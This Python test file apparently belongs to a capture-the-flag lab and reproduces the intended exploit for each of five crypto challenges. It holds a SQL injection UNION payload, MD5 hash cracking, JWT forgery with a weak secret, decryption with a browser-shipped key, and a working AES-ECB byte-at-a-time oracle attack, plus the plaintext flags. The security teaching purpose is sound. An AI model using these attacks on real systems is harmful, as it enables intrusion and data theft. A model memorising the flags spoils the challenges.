"""Phase 5b: each challenge is solved by *breaking* the crypto, not by reading
the source. These tests reproduce the intended exploit for every flag.

Spoilers: plaintext flags appear below, like the other phase tests.
"""
import base64
import binascii
import hashlib
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from portal import create_app  # noqa: E402
from portal.cryptolib import aes_cbc_decrypt_b64, jwt_decode, jwt_encode  # noqa: E402
from portal.crypto import JWT_SECRET  # noqa: E402


@pytest.fixture(scope="module")
def client(tmp_path_factory):
    home = tmp_path_factory.mktemp("mfano5b")
    env = dict(os.environ, MFANO_HOME=str(home))
    subprocess.run([sys.executable, "seed.py"], cwd=ROOT, env=env, check=True, capture_output=True)
    os.environ["MFANO_HOME"] = str(home)
    app = create_app({"TESTING": True})
    c = app.test_client()
    c.post("/login", data={"username": "MHS1007", "password": "Student@123"})
    return c


def _cookie(response, name):
    for header in response.headers.getlist("Set-Cookie"):
        if header.startswith(name + "="):
            return header.split(name + "=")[1].split(";")[0]
    return None


# --- C1: unsalted MD5 staff hash, crackable with a wordlist ------------------
def test_weak_hash_leaks_then_cracks_to_a_flag(client):
    # The injectable classmate search UNION-leaks the legacy staff hash.
    inj = "zzz%' UNION SELECT username, md5_password FROM legacy_staff-- -"
    body = client.get("/student/search", query_string={"q": inj}).get_data(as_text=True)
    assert "jmwangi" in body
    leaked_hash = "c378985d629e99a4e86213db0cd5e70d"
    assert leaked_hash in body
    assert "MFANO{" not in body  # the hash leaks, the flag does not

    # A wordlist cracks the unsalted MD5; "chocolate" is the pre-image.
    assert hashlib.md5(b"chocolate").hexdigest() == leaked_hash

    # Logging in with the cracked password reveals the flag.
    good = client.post("/staff/login", data={"username": "jmwangi", "password": "chocolate"})
    assert b"MFANO{md5_cr4ck3d_th3_st4ff_h4sh}" in good.data
    bad = client.post("/staff/login", data={"username": "jmwangi", "password": "nope"})
    assert b"MFANO{" not in bad.data


# --- C2: base64 is encoding, not encryption ---------------------------------
def test_fake_encryption_is_just_base64(client):
    resp = client.get("/student/")
    vault = _cookie(resp, "mfano_vault")
    assert vault is not None
    assert base64.b64decode(vault).decode() == "MFANO{b4s3_s1xtyf0ur_1s_n0t_crypt0}"


# --- C3: JWT signed with a weak, guessable secret ---------------------------
def test_weak_jwt_secret_forges_admin(client):
    resp = client.get("/student/")
    student_token = _cookie(resp, "mfano_api")
    # The weak secret is crackable; here we use it to verify and re-sign.
    assert jwt_decode(student_token, JWT_SECRET)["role"] == "student"
    assert client.get("/api/exam-key", headers={"Authorization": f"Bearer {student_token}"}).status_code == 403

    forged = jwt_encode({"sub": "MHS1007", "role": "admin"}, JWT_SECRET)
    out = client.get("/api/exam-key", headers={"Authorization": f"Bearer {forged}"}).get_json()
    assert out["flag"] == "MFANO{w34k_jwt_s3cr3t_f0rg3d_4dm1n}"


# --- C4: a hardcoded key shipped to the browser -----------------------------
def test_hardcoded_key_decrypts_the_flag(client):
    js = client.get("/static/app.config.js").get_data(as_text=True)
    assert "keyHex" in js and "encryptedTranscript" in js  # key + ciphertext shipped together
    key = binascii.unhexlify("0f1e2d3c4b5a69788796a5b4c3d2e1f0")
    blob = "ABEiM0RVZneImaq7zN3u/zZq3RYslyRepYavVAOlBbh+iLPcq610DptUyeh4UcXZ0dq4EnXt/FMxcSVth4sh9g=="
    assert aes_cbc_decrypt_b64(key, blob).decode() == "MFANO{h4rdc0d3d_k3y_1s_n0t_s3cr3t}"


# --- C5: AES-ECB oracle leaks the appended secret byte by byte ---------------
def test_ecb_oracle_leaks_the_secret(client):
    block = 16

    def oracle(prefix: bytes) -> bytes:
        q = base64.b64encode(prefix).decode()
        return bytes.fromhex(client.get("/api/seal", query_string={"q": q}).get_data(as_text=True))

    recovered = b""
    for _ in range(64):
        pad = b"A" * (block - 1 - (len(recovered) % block))
        index = len(recovered) // block
        target = oracle(pad)[index * block:(index + 1) * block]
        found = None
        for byte in range(256):
            if oracle(pad + recovered + bytes([byte]))[index * block:(index + 1) * block] == target:
                found = byte
                break
        if found is None:
            break
        recovered += bytes([found])
        if recovered.endswith(b"}"):
            break
    assert recovered == b"MFANO{3cb_r3p34ts_g1v3_1t_4w4y}"
